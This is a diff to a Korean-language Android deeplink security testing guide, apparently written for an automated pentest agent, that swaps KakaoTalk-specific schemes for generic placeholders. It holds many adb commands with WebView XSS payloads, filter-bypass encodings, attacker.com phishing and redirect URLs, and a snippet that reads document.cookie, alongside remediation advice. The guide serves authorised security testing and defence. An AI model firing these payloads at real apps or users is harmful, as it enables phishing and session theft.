@@ -84,11 +84,13 @@ Java.perform(() => {
 
 #### `WEBVIEW_XSS`
 
+> POC의 `<APP_SCHEME>://<deeplink-host>`는 **대상 앱의 실제 deeplink**(Manifest의 `<data android:scheme/host>`에서 추출)로 치환한다. 앱마다 형태가 다르다(예: `myapp://webview`, `shopapp://product/view`). 아래 예시 스킴은 그대로 복사하지 말고 대상 앱 값으로 바꾼다.
+
 기본 (`url=javascript:` 직접):
 ```bash
-# 카카오톡 같은 host별 WebView 진입점
+# host별 WebView 진입점 (스킴/호스트는 대상 앱 값으로 치환)
 adb shell am start -W -a android.intent.action.VIEW \
-  -d "kakaotalk://adwebview/reward?url=javascript:alert('XSS')"
+  -d "<APP_SCHEME>://<deeplink-host>?url=javascript:alert('XSS')"
 
 # App Links 환경
 adb shell am start -W -a android.intent.action.VIEW \
@@ -97,7 +99,7 @@ adb shell am start -W -a android.intent.action.VIEW \
 
 # 임의 외부 페이지 로드 (open redirect/phishing 변형)
 adb shell am start -W -a android.intent.action.VIEW \
-  -d 'kakaotalk://adwebview/reward?url=https://attacker.com/phish.html'
+  -d '<APP_SCHEME>://<deeplink-host>?url=https://attacker.com/phish.html'
 
 # loadDataWithBaseURL baseUrl 위장 (origin 위장 → cookie 탈취)
 adb shell am start -W -a android.intent.action.VIEW \
@@ -107,45 +109,45 @@ adb shell am start -W -a android.intent.action.VIEW \
 스킴 차단 우회 (대소문자/공백/인코딩):
 ```bash
 # 대소문자 변형
--d "kakaotalk://adwebview/reward?url=JaVaScRiPt:alert(1)"
--d "kakaotalk://adwebview/reward?url=JAVASCRIPT:alert(1)"
+-d "<APP_SCHEME>://<deeplink-host>?url=JaVaScRiPt:alert(1)"
+-d "<APP_SCHEME>://<deeplink-host>?url=JAVASCRIPT:alert(1)"
 
 # 선행 공백/탭/CR/LF (URL encoded)
--d "kakaotalk://adwebview/reward?url=%09javascript:alert(1)"   # TAB
--d "kakaotalk://adwebview/reward?url=%20javascript:alert(1)"   # space
--d "kakaotalk://adwebview/reward?url=%0Ajavascript:alert(1)"   # LF
--d "kakaotalk://adwebview/reward?url=%0Djavascript:alert(1)"   # CR
+-d "<APP_SCHEME>://<deeplink-host>?url=%09javascript:alert(1)"   # TAB
+-d "<APP_SCHEME>://<deeplink-host>?url=%20javascript:alert(1)"   # space
+-d "<APP_SCHEME>://<deeplink-host>?url=%0Ajavascript:alert(1)"   # LF
+-d "<APP_SCHEME>://<deeplink-host>?url=%0Djavascript:alert(1)"   # CR
 
 # 콜론 이후 공백/줄바꿈
--d "kakaotalk://adwebview/reward?url=javascript:%0aalert(1)"
+-d "<APP_SCHEME>://<deeplink-host>?url=javascript:%0aalert(1)"
 
 # URL encoding (`:` → %3A)
--d "kakaotalk://adwebview/reward?url=javascript%3Aalert(1)"
+-d "<APP_SCHEME>://<deeplink-host>?url=javascript%3Aalert(1)"
 
 # Double encoding
--d "kakaotalk://adwebview/reward?url=javascript%253Aalert(1)"
+-d "<APP_SCHEME>://<deeplink-host>?url=javascript%253Aalert(1)"
 
 # 부분 인코딩 (`j` → %6A)
--d "kakaotalk://adwebview/reward?url=%6Aavascript:alert(1)"
+-d "<APP_SCHEME>://<deeplink-host>?url=%6Aavascript:alert(1)"
 
 # Unicode escape
--d "kakaotalk://adwebview/reward?url=\u006Aavascript:alert(1)"
+-d "<APP_SCHEME>://<deeplink-host>?url=\u006Aavascript:alert(1)"
 
 # data: 스킴 (javascript: 차단되어도 우회)
--d "kakaotalk://adwebview/reward?url=data:text/html,<script>alert(1)</script>"
--d "kakaotalk://adwebview/reward?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
+-d "<APP_SCHEME>://<deeplink-host>?url=data:text/html,<script>alert(1)</script>"
+-d "<APP_SCHEME>://<deeplink-host>?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
 
 # vbscript:, livescript: (구버전 브라우저 — Android WebView 일부 환경)
--d "kakaotalk://adwebview/reward?url=vbscript:msgbox(1)"
+-d "<APP_SCHEME>://<deeplink-host>?url=vbscript:msgbox(1)"
 
 # Chained redirect — http(s) 화이트리스트 통과 후 attacker 페이지에서 location='javascript:...'
--d "kakaotalk://adwebview/reward?url=https://attacker.com/redir-to-js.html"
+-d "<APP_SCHEME>://<deeplink-host>?url=https://attacker.com/redir-to-js.html"
 ```
 
 shouldOverrideUrlLoading 누락 환경 — WebView 안에서 추가 URL 자동 로드:
 ```bash
 # attacker page에서 location.href = "javascript:..." 또는 "file:///..." 로 nested redirect
--d "kakaotalk://adwebview/reward?url=https://attacker.com/nested-xss.html"
+-d "<APP_SCHEME>://<deeplink-host>?url=https://attacker.com/nested-xss.html"
 # nested-xss.html 내부:
 # <script>setTimeout(()=>location='javascript:alert(document.cookie)',500)</script>
 ```
@@ -172,7 +174,7 @@ adb shell am start -W -a android.intent.action.VIEW \
 
 # 정상 도메인 redirect (단순 URL 임의 로드 검증)
 adb shell am start -W -a android.intent.action.VIEW \
-  -d "kakaotalk://adwebview/reward?url=https://www.naver.com/"
+  -d "<APP_SCHEME>://<deeplink-host>?url=https://example.com/"
 ```
 
 호스트 검증 우회:
@@ -373,9 +375,9 @@ myapp://USER:PASS@host/path                         (userinfo 포함 — 일부 
 
 - **환경 전제 조건**: Tier 2 이상은 `adb devices` + 대상 APK 설치 확인 후 진행. 미충족 시 사용자 안내 후 응답 받기 — 무단 진행 금지
 - **Tier 분리**: Tier 1 (assetlinks.json HTTP curl 검증) → curl만 가능. Tier 2 (`adb am start` 페이로드) → emulator/device 필요. Tier 3 (Frida hook, PoC APK 설치) → rooted device + 빌드 환경 필요. 환경에 맞춰 가능한 Tier만 수행
-- **외부 진입 영향도**: deeplink는 카카오톡/문자메시지/이메일/웹페이지 링크 클릭만으로 트리거 — 사용자가 URL을 직접 입력할 필요 없음. phishing 메시지에 `kakaotalk://...?url=javascript:...` 한 줄만 넣어 보내면 클릭 한 번으로 발화 → 영향도 큼
+- **외부 진입 영향도**: deeplink는 메신저/문자메시지/이메일/웹페이지 링크 클릭만으로 트리거 — 사용자가 URL을 직접 입력할 필요 없음. phishing 메시지에 `<app-scheme>://...?url=javascript:...` 한 줄만 넣어 보내면 클릭 한 번으로 발화 → 영향도 큼
 - **host별 routing 분기 모두 점검**: `when(uri.host){"adwebview"->...; "open"->...}` 같은 dispatch 코드는 host 한 곳만 검증 누락이어도 전체 게이트 — Phase 1에서 모든 분기 cross-check 필수
-- WebView XSS는 `url=javascript:`/`url=data:text/html,...`이 가장 흔한 형태 — 카카오톡 `kakaotalk://adwebview/reward?url=...` 같은 패턴이 다수 앱에 동일 구조로 존재
+- WebView XSS는 `url=javascript:`/`url=data:text/html,...`이 가장 흔한 형태 — 카카오톡 `<APP_SCHEME>://<deeplink-host>?url=...` 같은 패턴이 다수 앱에 동일 구조로 존재
 - 스킴 차단 시 **trim() + lowercase() + URL decode 후 검증**해야 안전 — 인코딩/대소문자 우회 다수
 - App Links (autoVerify=true + https + assetlinks.json) 외 모든 custom scheme은 **본질적으로 hijack 가능** — 민감 화면에 custom scheme만 사용하면 후보
 - assetlinks.json은 **모든 변형 host**에 배포 필요 — `example.com`, `www.example.com`, `m.example.com` 각각
